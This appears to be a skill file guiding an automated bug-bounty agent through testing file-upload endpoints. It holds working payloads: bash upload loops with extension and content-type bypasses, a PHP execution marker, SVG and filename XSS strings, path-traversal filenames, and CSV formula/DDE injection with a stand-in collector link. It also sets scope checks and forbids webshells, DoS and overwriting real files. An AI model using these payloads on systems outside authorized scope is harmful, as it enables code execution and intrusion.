---
name: zp-upload
description: ZeroProtocol hunter for unrestricted and unsafe file upload. Use when any endpoint accepts a file - avatars, attachments, imports, documents, images - when testing extension or content-type filters, when hunting upload-to-RCE or stored XSS via uploaded files, when checking where uploaded files are served from, or when probing image-processing libraries. Also covers path traversal in filenames and the access-control of other users' uploads.
---

# zp-upload - what happens after it lands

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

An upload is only a finding once you know **where the file went, what serves it, and with what
Content-Type**. A shell that lands in an S3 bucket behind a CDN that serves
`application/octet-stream` is not RCE and not XSS. Find the retrieval URL first; it decides
everything.

---

## Procedure

**1. Baseline a legitimate upload and follow it all the way back.**

```bash
printf 'zp-canary-91234' > ok.txt
curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
  -F 'file=@ok.txt;type=text/plain' -o up.json; jq . up.json
URL=$(jq -r '.url // .path // .location' up.json)
curl -skI "$URL" | grep -iE '^HTTP|content-type|content-disposition|x-content-type-options|cache-control'
```

| What you learn | Why it decides the hunt |
|---|---|
| served from the app's own origin | XSS and RCE are both live possibilities |
| served from a separate CDN/bucket domain | XSS is limited to that origin - check what it holds |
| `Content-Disposition: attachment` | browser downloads instead of rendering: XSS mostly dead |
| `X-Content-Type-Options: nosniff` | no MIME-sniffing tricks |
| filename preserved verbatim | traversal and double-extension tricks are in play |
| filename randomised (UUID) | you must retrieve the new name; no path guessing |
| predictable path (`/uploads/<uid>/<name>`) | check other users' files -> `zp-idor` |

**2. Probe the filter, and learn *which* filter it is.**

```bash
for spec in "s.php:application/x-php" "s.php:image/png" "s.PhP:image/png" \
            "s.php.png:image/png" "s.png.php:image/png" "s.phtml:image/png" \
            "s.php5:image/png" "s.svg:image/svg+xml" "s.html:text/html" \
            "s.xml:text/xml" "s.jsp:image/png" "s.aspx:image/png" \
            ".htaccess:text/plain" ".user.ini:text/plain" "web.config:text/xml"; do
  n=${spec%%:*}; t=${spec##*:}
  printf '%-16s %-24s ' "$n" "$t"
  curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
    -F "file=@ok.txt;filename=$n;type=$t" -o /dev/null -w '%{http_code}\n'
done
```

The last three have to be spelled exactly: Apache parses only its configured `AccessFileName`
(`.htaccess`), PHP-FPM only `.user.ini`, IIS only `web.config`. A file called `s.htaccess` is
inert, so a 200 on it proves nothing. Acceptance of the real name *is* the finding - report it as
an unrestricted upload of a server-config file and delete it; do not go on to install a handler
mapping, because that reconfigures the target rather than proving anything more.

Then the structural tricks:

```
extension:     .php.png  .png.php  .pHp  .php5 .phtml .phar  .php/  .php.
                trailing space or dot: "s.php "  "s.php."
                .php%00.png - only bites if the app urldecodes the filename itself
content-type:  declare image/png on a .php · declare application/x-php on a .png
magic bytes:   prepend GIF89a; (6-byte signature + 7-byte screen descriptor, so the payload
                bytes become the "dimensions") - defeats header sniffers and getimagesize
multipart:     two `filename=` attributes · a `;` or newline in the filename
                Content-Disposition with quoted/encoded name: filename="s.php"; filename*=UTF-8''s.php
archive:       zip containing ../../shell.php (zip-slip) · symlink inside a tar
```

Two of those need their limits stated, both measured. **Percent-encoding is not decoded by a
multipart parser** - `filename="s.php%00.png"` arrives as those literal characters, so `%00` and
`%2f` test "does the app urldecode the filename", not truncation or traversal. Genuine null-byte
truncation needs a raw `0x00` in the header value (most HTTP stacks now reject it) and only ever
affected PHP before 5.3.4, so keep the undecoded `../`, `..\`, `....//` forms as the primary
traversal probes. **A bare PNG signature is not a bypass**: `\x89PNG\r\n\x1a\n` + script is
reported by libmagic as plain `data` and rejected by PIL, because PNG carries its dimensions in
the IHDR chunk - append the payload to a real minimal PNG, or hide it in a `tEXt` chunk, instead.
`GIF89a;` + payload does pass libmagic (which reads 15419 x 28735 out of the script bytes) but
still fails a full decoder. Any pipeline that re-encodes the image destroys all of them.

**3. Verify execution, not upload.** A `200` on upload means nothing.

```bash
# The marker must be something the SOURCE CANNOT CONTAIN. An echo of a literal string
# appears in the response whether the file ran or was served as text, so it proves nothing.
# Use arithmetic the interpreter must evaluate:
printf 'GIF89a;<?php echo 7*6+7; ?>' > payload.bin
# Try the names in handler order, not just one: nginx, IIS and PHP-FPM SetHandler all key on
# the LAST extension, so s.php.png executes only under Apache mod_mime + AddHandler .php.
for n in s.png.php s.phtml s.phar s.php.png 's.php.' 's.php '; do
  cp payload.bin "$n"                 # upload "$n", then fetch its retrieval URL into $URL
  body=$(curl -sk "$URL")
  if grep -q '<?php' <<<"$body"; then
    echo "$n: served as source, NOT executed"
  elif grep -q '49' <<<"$body"; then
    echo "$n: CODE EXECUTED -> RCE"   # 49 cannot appear in the uploaded bytes
  else
    echo "$n: inconclusive - inspect the body by hand"
  fi
done
```

Only say "not RCE" after the whole set - and after confirming the store directory is served by
the app origin at all.

If the payload comes back verbatim with `<?php` visible, the file is being served as static
content. That is not RCE. It may still be stored XSS if the Content-Type allows.

**Keep the payload to an `echo`.** A one-line marker proves arbitrary code execution as
completely as a webshell does, and leaves nothing behind. Never upload a webshell, a reverse
shell, or anything that accepts commands.

**4. Stored XSS via upload - often easier than RCE and frequently overlooked.**

```
SVG           <svg xmlns="http://www.w3.org/2000/svg" onload="alert(91234)"/>
HTML          plain .html with a script - works when served inline from the app origin
XML           served as text/xml can render script in some browsers
PDF           JS in a PDF, when rendered inline by the browser's viewer
CSV           formula injection: =1+1 renders as 2 (formula evaluated), or
              =HYPERLINK("https://collector/x","click") — open it yourself, never send it
              to a real employee. =cmd|'/c calc'!A0 is the DDE form: cite it as historical,
              since DDE is off by default in supported Excel builds since 2017-2018
filename      "><img src=x onerror=alert(91234)>.png   — if the filename is rendered anywhere
image meta    payload in EXIF Comment, surfaced by a gallery that prints metadata
```

SVG is the highest-yield: it is an image to the upload filter and a document to the browser.
Confirm it renders **inline** from the app's own origin - that is what makes it session-relevant.

**5. Path traversal in the filename.**

```bash
for n in '../../../../tmp/zp91234.txt' '..%2f..%2fzp91234.txt' \
         '....//....//zp91234.txt' '/absolute/zp91234.txt' '..\..\zp91234.txt'; do
  curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
    -F "file=@ok.txt;filename=$n" -o /dev/null -w "$n -> %{http_code}\n"
done
```

Write **only** to `/tmp` or a path you can verify is unused. Never target a real application
file - overwriting `index.php` or a config is destruction, not proof.

**6. Image-processing and conversion sinks.** The library is often the vulnerability.

```
ImageMagick   ImageTragick-class issues via MVG/MSL/SVG delegates - check the version first
Ghostscript   PostScript escapes in an uploaded EPS/PDF
ffmpeg        HLS/SSRF via a crafted playlist file - reads local files into the output
LibreOffice   macro and external-link handling in converted documents
ExifTool      known argument-injection/RCE classes - check the version
zip/tar       zip-slip and symlink extraction
```

Identify the version from response headers, output metadata, or an error, and check it against
known CVEs before crafting anything - a known CVE on an old version is a clean, fast report.

**7. Everything else the upload touches.**

```
size/DoS          DO NOT test. Excluded by essentially every program
other users' files  GET /uploads/<B_UID>/<name> as A   -> zp-idor
listable directory  GET /uploads/   -> information disclosure
antivirus bypass    only relevant if the program says files are scanned
re-upload/overwrite can you replace another user's file by name?
SSRF on "import from URL"  -> zp-ssrf
XXE in DOCX/XLSX/SVG       -> zp-xxe-lfi
```

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| uploaded code executes when fetched | **confirmed RCE.** Critical. Delete the file, report now |
| SVG/HTML renders script inline from the app origin | **confirmed stored XSS.** High |
| file served with `Content-Disposition: attachment` | XSS killed. Check for other impacts |
| file served from an isolated bucket origin | XSS severity drops sharply - state what that origin holds |
| payload returned verbatim as text | stored, not executed. Not RCE |
| 200 on upload, file not retrievable | **nothing yet.** Find the retrieval path or you have no finding |
| traversal wrote outside the upload dir | confirmed arbitrary write. High to Critical |
| A can read B's uploads | that is `zp-idor`, and often the easier report |
| dangerous extension accepted but stored outside the webroot | not RCE. Say so |
| CSV formula injection | real but commonly Low/N-A - check the program's stance first |
| upload directory lists | information disclosure, Low to Medium |

**The dominant false positive:** reporting "unrestricted file upload" because a `.php` was
accepted. If it is not reachable, not executed, and not rendered, there is no impact. Retrieve
it or drop it.

---

## High-value patterns

- **SVG avatar rendered inline on the main origin** - stored XSS on every profile viewer.
- **A document converter shelling out to ImageMagick/Ghostscript/ffmpeg** on an old version.
- **An import feature writing into a directory that is also served** - the classic upload-to-RCE.
- **Predictable upload paths across tenants** - `zp-idor` on every customer's documents.
- **Filename reflected in a UI** - XSS with no file interpretation needed at all.
- **Zip import with zip-slip** - arbitrary write, frequently overlooked.
- **Profile-picture endpoints on legacy subdomains** - old code, weak filters.

---

## Pitfalls

- **Uploading a webshell or reverse shell.** An `echo` marker proves the same thing safely.
- **Testing upload size limits or ZIP bombs.** That is DoS.
- **Overwriting a real application file** to prove arbitrary write. Write to `/tmp`.
- **Reporting an accepted extension with no retrieval path.**
- **Claiming XSS on a file served as `attachment`** or from a sandboxed origin.
- **Leaving your files behind.** Delete every one, and say so in the report.
- **Uploading anything illegal or offensive** as a test file. Use a text canary.
- **Missing the simplest win** - the filename rendered in the UI.
- **Ignoring where it is served from.** That single fact decides the whole severity.

---

## Hand off to

RCE -> `zp-rce-ssti` for the impact framing, then `zp-triage` and `zp-report` immediately.
Stored XSS -> `zp-xss` for browser proof and the escalation chain.
SVG/DOCX XXE -> `zp-xxe-lfi`. Other users' files -> `zp-idor`.
Import-from-URL -> `zp-ssrf`. Bucket-hosted uploads -> `zp-cloud`.
